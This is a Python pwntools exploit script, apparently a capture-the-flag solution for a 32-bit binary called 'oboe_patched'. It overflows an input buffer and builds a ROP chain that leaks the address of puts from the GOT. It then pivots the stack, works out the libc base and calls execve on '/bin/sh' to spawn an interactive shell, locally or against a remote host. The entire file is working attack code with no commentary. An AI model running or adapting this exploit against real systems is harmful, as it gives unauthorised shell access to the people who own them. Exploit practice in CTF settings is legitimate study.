from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def padPayload(s, size, used=0, extra=0):
    assert len(s) < size, "Payload bigger than size! ("+str(size)+")"
    return b"A"*(size - len(s) - 8*used - extra)
    
gdbscript='''
init-pwndbg
b *0x8048516
b *0x80486c1
continue
'''.format(**locals())

exe = "./oboe_patched"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"

io = start()
libc = ELF("libc6-i386_2.27-3ubuntu1.6_amd64.so", checksec=False)
# Send 64 bytes characters to the buffer 2 times
io.sendlineafter(b":", b"A" * 64)
io.sendlineafter(b":", b"A" * 64)

# Payload for leaking an address at GOT
writable = 0x0804a000 + 0x205 # Empty writable space in GOT
pop_ebx_ebp = ROP(elf).find_gadget(['pop ebx','pop ebp', 'ret'])[0]
leave_ret = ROP(elf).find_gadget(['leave','ret'])[0]

payload = flat([
    b"A" * 10,
    elf.sym['puts'],
    pop_ebx_ebp,
    elf.got.puts,
    writable,
    elf.sym['getInput'],
    leave_ret,
    writable,
])
payload += padPayload(payload, 63)

io.sendlineafter(b":", payload)
io.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAA\n")
leak = unpack(io.recv(4))
info(f"GOT Puts Leak : {hex(leak)}")
libc.address = leak - libc.sym['puts']
info(f"LIBC Base : {hex(libc.address)}")

payload2 = flat([
    b"A" *4,
    libc.sym['execve'],
    pop_ebx_ebp,
    next(libc.search(b"/bin/sh\x00")),
    0x0
])

io.sendline(payload2)
io.interactive()